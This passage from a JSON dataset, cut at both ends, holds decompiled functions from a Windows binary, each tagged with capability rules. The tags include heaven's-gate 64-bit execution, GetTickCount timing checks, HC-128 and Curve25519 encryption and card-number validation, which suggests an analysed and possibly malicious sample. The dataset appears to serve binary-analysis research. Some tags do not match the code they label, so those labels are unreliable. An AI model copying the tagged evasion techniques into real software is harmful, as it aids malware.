        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fa7f(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint var_9ch;\n    uint var_94h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_ch;\n    \n    *0x433860 = 0;\n    *0x433864 = 0;\n    arg_8h_00 = fcn.0040ef07();\n    iVar2 = 0;\n    do {\n        uVar1 = fcn.0040f6f1(arg_8h_00, &var_ch);\n        if ((1 < uVar1) && ((uVar1 < 4 || (uVar1 == 6)))) {\n            iVar3 = fcn.0040f9ae(arg_8h, &var_ch);\n            *0x433860 = iVar3 + *0x433860;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x1a);\n    var_4ch = 0x40;\n    (**0x413430)(&var_4ch);\n    *0x433860 = *0x433860 - CONCAT44(var_30h, var_34h);\n    iVar2 = (**0x413240)(4, 0, 0, &var_9ch, 0x4c);\n    if ((-1 < iVar2) && (var_94h != '\\0')) {\n        *0x433860 = *0x433860 - CONCAT44(var_40h, var_44h);\n    }\n    *0x433864 = *0x433860 >> 0x20;\n    return;\n}\n",
        "token_count": 423
    },
    "00402230": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402230(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.00410467();\n    if (uVar2 != '\\0') {\n        fcn.00407c1d(str.ZEQ_, 7, 0xf3352960);\n        iVar3 = fcn.00402cec();\n        uVar4 = var_8h;\n        if (iVar3 != 0) {\n            fcn.00407c1d(str.ZEQ_, 7, 0xf3352960);\n            fcn.00402cec();\n            iVar7 = fcn.00402da4();\n            *0x43358a = iVar7 != 0;\n            fcn.00407c1d(0x411e60, 0xb, 0xbed5fe46);\n            fcn.00402cec();\n            iVar7 = fcn.00402da4();\n            if (iVar7 == 0) {\n                *0x433588 = 0;\n            }\n            else {\n                *0x433588 = 1;\n                fcn.00407c1d(0x411e6c, 0x10, 0x176dd6bf);\n                fcn.00402cec();\n                *0x433584 = fcn.00402da4();\n                if ((*0x433584 == 0) || (5 < *0x433584)) {\n                    *0x433584 = 2;\n                }\n            }\n            fcn.00407c1d(0x411e80, 0xe, 0x60485f28);\n            fcn.00402cec();\n            *0x4335a4 = fcn.00402da4();\n            if (*0x4335a4 == 0) {\n                *0x4335a4 = 0x80;\n            }\n            *0x4335a4 = *0x4335a4 << 0x14;\n            fcn.00407c1d(0x411e90, 7, 0x96aa56fe);\n            fcn.00402cec();\n            *0x4335c4 = fcn.00402da4();\n            if (*0x4335c4 == 0) {\n                *0x4335c4 = 0x20000;\n            }\n            fcn.00407c1d(0x411e98, 10, 0x2cb84bfa);\n            fcn.00402cec();\n            *0x4335a8 = fcn.00402da4();\n            fcn.00407c1d(0x411ea4, 0xd, 0x4c5b507e);\n            fcn.00402cec();\n            *0x433590 = fcn.00402da4();\n            fcn.00407c1d(0x411eb4, 0xc, 0xe2e29099);\n            fcn.00402cec();\n            uVar4 = fcn.00402da4();\n            if (uVar4 < 0x240) {\n                uVar4 = 0x240;\n            }\n            for (; (uVar4 & 7) != 0; uVar4 = uVar4 + 1) {\n            }\n        }\n        cVar1 = fcn.00402150();\n        if (cVar1 == '\\0') {\n            iVar3 = fcn.004101b2(arg_8h);\n            if (iVar3 != 0) {\n                var_4h = 0;\n                var_8h = 0;\n                cVar1 = fcn.004102fd(uVar4, &var_4h, &var_8h);\n                if (cVar1 != '\\0') {\n                    *0x43358c = var_8h;\n                    *0x43359c = fcn.00410067(iVar3, var_4h, 0x43358c);\n                    if (*0x43359c != 0) {\n                        *0x4335b0 = fcn.00410437(*0x433dd4, *0x433dcc);\n                        if (*0x4335b0 != 0) {\n                            *0x433dd0 = fcn.00401209();\n                            if (*0x433dd0 != 0) {\n                                iVar5 = fcn.0041002f(*0x4335b0);\n                                uVar6 = iVar5 - 0xbU & 0xffff;\n                                uVar4 = uVar6 - 0x17;\n                                if (0xf < uVar4) {\n                                    uVar4 = 0x10;\n                                }\n                                *0x433598 = *0x433598 & 0xffff0000 | uVar4 & 0xffff;\n                                *0x4335a0 = (uVar6 - (uVar4 & 0xffff)) - 0x17;\n                                *0x433580 = *0x4335a0 + 0x17 + (uVar4 & 0xffff);\n                                fcn.0040fc0e(*0x433dd0, *0x433dc8, 0x4335b4);\n                            }\n                        }\n                    }\n                    fcn.00406d6b();\n                }\n                (**0x4137e0)(iVar3);\n            }\n        }\n        else {\n            *0x433589 = 1;\n        }\n        uVar2 = 0;\n        if ((*0x4335b0 != 0) && (*0x43359c != 0)) {\n            uVar2 = 1;\n        }\n    }\n    *0x4335ac = *0x4335a8 >> 0x20;\n    *0x433594 = *0x433590 >> 0x20;\n    return uVar2;\n}\n",
        "token_count": 1348
    },
    "00402cec": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402cec(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    cVar1 = fcn.00408e75();\n    if ((((cVar1 != '\\0') && (cVar1 = fcn.00402a76(),  cVar1 != '\\0')) && (*(param_1 + 0x14) == 5)) &&\n       (iVar2 = fcn.00402a9e(),  iVar2 != 0)) {\n        iVar4 = *(param_1 + 0x10);\n        while ((iVar3 = var_8h,  iVar4 != 0 &&\n               ((iVar3 = (**0x41338c)(*(iVar4 + 0x1c), iVar2),  iVar3 != 0 ||\n                (bVar5 = var_4h != 0,  iVar3 = iVar4,  var_4h = var_4h + -1,  bVar5))))) {\n            iVar4 = *(iVar4 + 8);\n        }\n        var_8h = iVar3;\n        fcn.00406d25();\n    }\n    return var_8h;\n}\n",
        "token_count": 320
    },
    "00407a8a": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00407a8a(char param_1)\n\n{\n    char cVar1;\n    \n    cVar1 = -1;\n    if (param_1 - 0x30U < 10) {\n        return param_1 + -0x30;\n    }\n    if (param_1 + 0x9fU < 6) {\n        return param_1 + -0x57;\n    }\n    if (param_1 + 0xbfU < 6) {\n        cVar1 = param_1 + -0x37;\n    }\n    return cVar1;\n}\n",
        "token_count": 133
    },
    "00402869": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00402869(void)\n\n{\n    char cVar1;\n    \n    if (*0x434594 < 6) {\n        cVar1 = fcn.00402746();\n    }\n    else {\n        cVar1 = fcn.00402746();\n        if (cVar1 == '\\0') {\n            return false;\n        }\n        cVar1 = fcn.00402819();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 100
    },
    "0040a905": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a905(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *unaff_EBX;\n    uint var_4h;\n    \n    uVar3 = (**0x4133a4)(arg_ch);\n    *in_EAX = *in_EAX + -6 + uVar3;\n    if (6 < uVar3) {\n        iVar1 = *arg_8h;\n        iVar2 = *unaff_EBX;\n        iVar4 = fcn.00406c8c();\n        *arg_8h = iVar4;\n        *unaff_EBX = iVar4 + (iVar2 - iVar1 >> 1) * 2;\n    }\n    (**0x413390)(*unaff_EBX, arg_ch);\n    *unaff_EBX = *unaff_EBX + uVar3 * 2;\n    return;\n}\n",
        "token_count": 233
    },
    "0040c2ab": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c2ab(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "0040430d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040430d(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    if (param_1 != 0) {\n        puVar3 = param_2 + param_1 * 4;\n        do {\n            puVar3 = puVar3 + -1;\n            uVar1 = *((param_3 - param_2) + puVar3);\n            uVar2 = *puVar3;\n            param_1 = param_1 + -1;\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 1;\n            }\n            if (uVar1 < uVar2) {\n                return 0xffffffff;\n            }\n        } while (param_1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 208
    },
    "004043ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004043ec(int32_t arg_8h, uint32_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_10h;\n    if (arg_10h < 0x20) {\n        arg_10h = 0;\n        uVar1 = uVar3;\n        uVar3 = arg_10h;\n        if (arg_14h != 0) {\n            arg_8h = arg_8h - arg_ch;\n            var_4h = arg_14h;\n            do {\n                uVar3 = (*arg_ch & ~(0xffffffffU >> (uVar1 & 0x1f))) >> (0x20 - uVar1 & 0x1f);\n                *(arg_8h + arg_ch) = *arg_ch << (uVar1 & 0x1f) | arg_10h;\n                arg_ch = arg_ch + 1;\n                var_4h = var_4h - 1;\n                arg_10h = uVar3;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + (arg_14h - uVar3);\n            uVar2 = arg_14h;\n            do {\n                uVar2 = uVar2 - 1;\n                puVar4 = puVar4 + -1;\n                if (uVar2 < uVar3) {\n                    *(arg_8h + uVar2 * 4) = 0;\n                }\n                else {\n                    *(arg_8h + uVar2 * 4) = *puVar4;\n                }\n            } while (uVar2 != 0);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar3 = arg_ch[arg_14h - uVar3] << arg_10h;\n        if (arg_10h != 0) {\n            uVar2 = fcn.004043ec(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar3 = uVar3 | uVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 573
    },
    "00404668": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404668(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t unaff_EDI;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((in_EAX == 0) || (arg_ch == 0)) {\n        var_4h = 0;\n    }\n    else {\n        uVar1 = 0x80000000;\n        var_8h = 0;\n        do {\n            if ((arg_ch & uVar1) != 0) break;\n            uVar1 = uVar1 >> 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0x20);\n        var_4h = fcn.004043ec(unaff_EDI, arg_8h, var_8h, in_EAX);\n        arg_8h_00 = unaff_EDI + in_EAX * 4;\n        do {\n            arg_8h_00 = arg_8h_00 + -4;\n            fcn.00403c7e(arg_8h_00, &var_4h, arg_ch << (var_8h & 0x1f));\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n        var_4h = var_4h >> (var_8h & 0x1f);\n    }\n    return var_4h;\n}\n",
        "token_count": 370
    },
    "00406f3e": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.00406f3e(uint8_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    uVar6 = *arg_8h;\n    *in_EAX = 0;\n    in_EAX[1] = 0;\n    in_EAX[2] = 0;\n    in_EAX[3] = 0;\n    var_8h = arg_8h;\n    in_EAX[4] = 0;\n    if (uVar6 == 0x2a) {\n        in_EAX[1] = in_EAX[1] | 0x40;\n        var_8h = arg_8h + 1;\n    }\n    iVar3 = fcn.00408954();\n    in_EAX[2] = iVar3;\n    if (iVar3 == 0) {\n        in_EAX[2] = -1;\n    }\n    uVar6 = *var_8h;\n    if (uVar6 == 0x6c) {\n        if (var_8h[1] == 0x6c) {\n            in_EAX[1] = in_EAX[1] | 0x10;\n            var_8h = var_8h + 2;\n        }\n        else {\n            in_EAX[1] = in_EAX[1] | 1;\n            var_8h = var_8h + 1;\n        }\n        goto code_r0x00406ff7;\n    }\n    if (uVar6 == 0x68) {\n        in_EAX[1] = in_EAX[1] | 2;\n    }\n    else if (uVar6 == 0x77) {\n        in_EAX[1] = in_EAX[1] | 4;\n    }\n    else {\n        if (uVar6 != 0x4c) {\n            if (uVar6 == 0x49) {\n                if ((var_8h[1] == 0x36) && (var_8h[2] == 0x34)) {\n                    uVar4 = in_EAX[1] & 0xfffffff7U | 0x10;\n                }\n                else {\n                    if ((var_8h[1] != 0x33) || (var_8h[2] != 0x32)) {\n                        in_EAX[1] = in_EAX[1] & 0xffffffe7U | 0x20;\n                        var_8h = var_8h + 1;\n                        goto code_r0x00406ff7;\n                    }\n                    uVar4 = in_EAX[1] & 0xffffffefU | 8;\n                }\n                in_EAX[1] = uVar4;\n                var_8h = var_8h + 3;\n            }\n            goto code_r0x00406ff7;\n        }\n        in_EAX[1] = in_EAX[1] | 0x10;\n    }\n    var_8h = var_8h + 1;\ncode_r0x00406ff7:\n    iVar3 = fcn.00406e0a();\n    if (iVar3 == 0) {\n        var_8h = arg_8h + -1;\n    }\n    else if (*in_EAX == 9) {\n        iVar3 = fcn.00406c76();\n        puVar7 = var_8h + 1;\n        uVar6 = *puVar7;\n        in_EAX[4] = iVar3;\n        if (uVar6 == 0x5e) {\n            puVar7 = var_8h + 2;\n            *(in_EAX + 3) = 1;\n        }\n        var_8h = puVar7;\n        var_1h._0_1_ = 0;\n        if (*puVar7 == 0x5d) {\n            *(iVar3 + 0xb) = *(iVar3 + 0xb) | 0x20;\n            var_8h = puVar7 + 1;\n            var_1h._0_1_ = 0x5d;\n        }\n        while ((uVar6 = *var_8h,  uVar6 != 0 && (uVar6 != 0x5d))) {\n            if ((uVar6 == 0x2d) && ((var_1h != 0 && (uVar2 = var_8h[1],  uVar2 != 0x5d)))) {\n                puVar7 = var_8h + 2;\n                uVar6 = uVar2;\n                if (var_1h < uVar2) {\n                    uVar6 = var_1h;\n                    var_1h._0_1_ = uVar2;\n                }\n                if (uVar6 < var_1h) {\n                    var_8h = var_1h - uVar6;\n                    iVar5 = uVar6;\n                    do {\n                        puVar1 = (iVar5 >> 3) + iVar3;\n                        *puVar1 = *puVar1 | '\\x01' << (iVar5 & 7);\n                        iVar5 = iVar5 + 1;\n                        var_8h = var_8h - 1;\n                    } while (var_8h != NULL);\n                }\n                puVar1 = (var_1h >> 3) + iVar3;\n                *puVar1 = *puVar1 | '\\x01' << (var_1h & 7);\n                var_8h = puVar7;\n                var_1h._0_1_ = 0;\n            }\n            else {\n                puVar7 = (uVar6 >> 3) + iVar3;\n                *puVar7 = *puVar7 | '\\x01' << (uVar6 & 7);\n                var_8h = var_8h + 1;\n                var_1h._0_1_ = uVar6;\n            }\n        }\n    }\n    return var_8h + (1 - arg_8h);\n}\n",
        "token_count": 1440
    },
    "00408493": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408493(int16_t *arg_8h, uint *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int16_t *var_4h;\n    \n    iVar1 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    var_4h = arg_8h;\n    arg_ch[3] = 0;\n    if (iVar1 == 0x2d) {\n        arg_ch[1] = arg_ch[1] | 1;\n        var_4h = arg_8h + 1;\n    }\n    if (*var_4h == 0x2b) {\n        var_4h = var_4h + 1;\n        arg_ch[1] = arg_ch[1] & 0xfffffbff | 0x200;\n    }\n    if (*var_4h == 0x20) {\n        if ((arg_ch[1] & 0x200) == 0) {\n            arg_ch[1] = arg_ch[1] | 0x400;\n        }\n        var_4h = var_4h + 1;\n    }\n    if (*var_4h == 0x23) {\n        arg_ch[1] = arg_ch[1] | 2;\n        var_4h = var_4h + 1;\n    }\n    if (*var_4h == 0x30) {\n        arg_ch[1] = arg_ch[1] | 0x1004;\n        var_4h = var_4h + 1;\n    }\n    iVar2 = fcn.00408380();\n    arg_ch[2] = iVar2;\n    if ((iVar2 != 0) && ((arg_ch[1] & 2) != 0)) {\n        arg_ch[1] = arg_ch[1] | 0x1000;\n    }\n    if (*var_4h == 0x2e) {\n        var_4h = var_4h + 1;\n        uVar3 = fcn.00408380();\n        arg_ch[3] = uVar3;\n    }\n    iVar1 = *var_4h;\n    if (iVar1 == 0x6c) {\n        if (var_4h[1] == 0x6c) {\n            arg_ch[1] = arg_ch[1] | 0x100;\n            var_4h = var_4h + 2;\n        }\n        else {\n            arg_ch[1] = arg_ch[1] | 8;\n            var_4h = var_4h + 1;\n        }\n        goto code_r0x004085e1;\n    }\n    if (iVar1 == 0x68) {\n        arg_ch[1] = arg_ch[1] | 0x10;\n    }\n    else {\n        if (iVar1 != 0x77) {\n            if (iVar1 == 0x49) {\n                if ((var_4h[1] == 0x36) && (var_4h[2] == 0x34)) {\n                    uVar4 = arg_ch[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((var_4h[1] != 0x33) || (var_4h[2] != 0x32)) {\n                        arg_ch[1] = arg_ch[1] & 0xfffffe7f | 0x800;\n                        var_4h = var_4h + 1;\n                        goto code_r0x004085e1;\n                    }\n                    uVar4 = arg_ch[1] & 0xfffffeff | 0x80;\n                }\n                arg_ch[1] = uVar4;\n                var_4h = var_4h + 3;\n            }\n            goto code_r0x004085e1;\n        }\n        arg_ch[1] = arg_ch[1] | 0x40;\n    }\n    var_4h = var_4h + 1;\ncode_r0x004085e1:\n    iVar2 = fcn.004083a4();\n    if (iVar2 == 0) {\n        var_4h = arg_8h + -1;\n    }\n    return (var_4h - arg_8h >> 1) + 1;\n}\n",
        "token_count": 1001
    },
    "00408974": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00408974(char *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    char *var_4h;\n    \n    cVar1 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    var_4h = arg_8h;\n    arg_ch[3] = 0;\n    if (cVar1 == '-') {\n        arg_ch[1] = arg_ch[1] | 1;\n        var_4h = arg_8h + 1;\n    }\n    if (*var_4h == '+') {\n        var_4h = var_4h + 1;\n        arg_ch[1] = arg_ch[1] & 0xfffffbff | 0x200;\n    }\n    if (*var_4h == ' ') {\n        if ((arg_ch[1] & 0x200) == 0) {\n            arg_ch[1] = arg_ch[1] | 0x400;\n        }\n        var_4h = var_4h + 1;\n    }\n    if (*var_4h == '#') {\n        arg_ch[1] = arg_ch[1] | 2;\n        var_4h = var_4h + 1;\n    }\n    if (*var_4h == '0') {\n        arg_ch[1] = arg_ch[1] | 0x1004;\n        var_4h = var_4h + 1;\n    }\n    iVar2 = fcn.00408954();\n    arg_ch[2] = iVar2;\n    if ((iVar2 != 0) && ((arg_ch[1] & 2) != 0)) {\n        arg_ch[1] = arg_ch[1] | 0x1000;\n    }\n    if (*var_4h == '.') {\n        var_4h = var_4h + 1;\n        uVar3 = fcn.00408954();\n        arg_ch[3] = uVar3;\n    }\n    cVar1 = *var_4h;\n    if (cVar1 == 'l') {\n        if (var_4h[1] == 'l') {\n            arg_ch[1] = arg_ch[1] | 0x100;\n            var_4h = var_4h + 2;\n        }\n        else {\n            arg_ch[1] = arg_ch[1] | 8;\n            var_4h = var_4h + 1;\n        }\n        goto code_r0x00408aa5;\n    }\n    if (cVar1 == 'h') {\n        arg_ch[1] = arg_ch[1] | 0x10;\n    }\n    else {\n        if (cVar1 != 'w') {\n            if (cVar1 == 'I') {\n                if ((var_4h[1] == '6') && (var_4h[2] == '4')) {\n                    uVar4 = arg_ch[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((var_4h[1] != '3') || (var_4h[2] != '2')) {\n                        arg_ch[1] = arg_ch[1] & 0xfffffe7f | 0x800;\n                        var_4h = var_4h + 1;\n                        goto code_r0x00408aa5;\n                    }\n                    uVar4 = arg_ch[1] & 0xfffffeff | 0x80;\n                }\n                arg_ch[1] = uVar4;\n                var_4h = var_4h + 3;\n            }\n            goto code_r0x00408aa5;\n        }\n        arg_ch[1] = arg_ch[1] | 0x40;\n    }\n    var_4h = var_4h + 1;\ncode_r0x00408aa5:\n    iVar2 = fcn.004083a4();\n    if (iVar2 == 0) {\n        var_4h = arg_8h + -1;\n    }\n    return var_4h + (1 - arg_8h);\n}\n",
        "token_count": 955
    },
    "00404758": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404758(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.00404372();\n    uVar3 = iVar2 + 7U >> 3;\n    uVar4 = 0;\n    iVar2 = arg_14h + -1;\n    if (arg_ch != 0) {\n        do {\n            if (iVar2 < 0) {\n                return uVar3;\n            }\n            uVar1 = *(arg_8h + uVar4 * 4);\n            arg_14h = 0;\n            do {\n                if (0x1f < arg_14h) break;\n                *(iVar2 + arg_10h) = uVar1 >> (arg_14h & 0x1f);\n                iVar2 = iVar2 + -1;\n                arg_14h = arg_14h + 8;\n            } while (-1 < iVar2);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < arg_ch);\n    }\n    for (; -1 < iVar2; iVar2 = iVar2 + -1) {\n        *(iVar2 + arg_10h) = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 324
    },
    "00405b00": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405b00(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h != 0) {\n        uVar5 = 0;\n        uVar3 = in_EAX & 7;\n        uVar4 = 0;\n        if (uVar3 != 0) {\n            uVar5 = *((in_EAX >> 3) + arg_8h) >> (8U - uVar3 & 0x1f);\n            uVar4 = uVar3;\n        }\n        var_8h = in_EAX >> 3;\n        uVar3 = arg_10h + 7 >> 3;\n        iVar6 = 0;\n        if (uVar3 != 0) {\n            do {\n                if (iVar6 == uVar3 - 1) {\n                    var_4h = 8;\n                    if ((arg_10h & 7) != 0) {\n                        var_4h = arg_10h & 7;\n                    }\n                    uVar2 = *(iVar6 + arg_ch) >> (8 - var_4h & 0x1f) | uVar5 << var_4h;\n                    uVar4 = uVar4 + var_4h;\n                }\n                else {\n                    uVar2 = *(iVar6 + arg_ch) ^ uVar5 << 8;\n                    uVar4 = uVar4 + 8;\n                }\n                uVar5 = uVar2;\n                while ((iVar6 != uVar3 - 1 && 7 < uVar4 || (0 < uVar4 && iVar6 == uVar3 - 1))) {\n                    var_4h = 8;\n                    if (uVar4 < 9) {\n                        var_4h = uVar4;\n                    }\n                    cVar1 = uVar4;\n                    uVar4 = uVar4 - var_4h;\n                    *(var_8h + arg_8h) =\n                         (uVar2 >> (cVar1 - var_4h & 0x1f)) << (8 - var_4h & 0x1f) & 0xff00 >> (var_4h & 0x1f);\n                    var_8h = var_8h + 1;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 634
    },
    "00405eb7": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405eb7(int32_t s2, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h_00;\n    int32_t unaff_ESI;\n    int32_t iVar3;\n    uint32_t var_4h;\n    \n    if (unaff_ESI == 0) {\n        iVar3 = 3;\n    }\n    else if (*(unaff_ESI + 0x10c) == 0) {\n        iVar3 = 5;\n    }\n    else if (s2 == 0) {\n        iVar3 = 8;\n    }\n    else {\n        var_4h = 0;\n        if ((arg_10h != 0) || (arg_ch != 0)) {\n            do {\n                arg_10h_00 = 0x1000 - *(unaff_ESI + 0x3b7c);\n                if ((arg_10h == arg_ch < var_4h) && (arg_ch - var_4h < arg_10h_00)) {\n                    arg_10h_00 = arg_ch - var_4h;\n                }\n                if ((((arg_10h_00 & 7) == 0) && ((*(unaff_ESI + 0x3b7c) & 7) == 0)) && ((var_4h & 7) == 0)) {\n                    sub.ntdll.dll_memcpy\n                              ((*(unaff_ESI + 0x3b7c) >> 3) + 0x378 + unaff_ESI, (var_4h >> 3) + s2, arg_10h_00 >> 3);\n                }\n                else {\n                    fcn.00405b00(unaff_ESI + 0x378, (var_4h >> 3) + s2, arg_10h_00);\n                }\n                var_4h = var_4h + arg_10h_00;\n                *(unaff_ESI + 0x3b7c) = *(unaff_ESI + 0x3b7c) + arg_10h_00;\n                puVar1 = unaff_ESI + 0x110;\n                uVar2 = *puVar1;\n                *puVar1 = *puVar1 + arg_10h_00;\n                *(unaff_ESI + 0x114) = *(unaff_ESI + 0x114) + CARRY4(uVar2, arg_10h_00);\n                if (((*(unaff_ESI + 0x3b7c) == 0x1000) && ((arg_10h != 0 || (var_4h < arg_ch)))) &&\n                   (iVar3 = fcn.00405d6a(unaff_ESI, 1, 0),  iVar3 != 0)) {\n                    return iVar3;\n                }\n            } while ((arg_10h != 0) || (var_4h < arg_ch));\n        }\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 695
    },
    "0041002f": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041002f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 0;\n    var_4h = 0;\n    var_8h = 4;\n    iVar1 = (**0x4137f4)(arg_8h, 9, &var_4h, &var_8h, 0);\n    if (iVar1 != 0) {\n        uVar2 = var_4h + 7U >> 3;\n    }\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "00404372": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404372(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        uVar4 = fcn.0040435e(param_2);\n        iVar1 = uVar4;\n        if (iVar1 != 0) {\n            iVar3 = 0;\n            uVar2 = 0x80000000;\n            do {\n                if ((uVar2 & *((uVar4 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n                iVar3 = iVar3 + 1;\n                uVar2 = uVar2 >> 1;\n            } while (uVar2 != 0);\n            return iVar1 * 0x20 - iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 227
    },
    "004065a7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
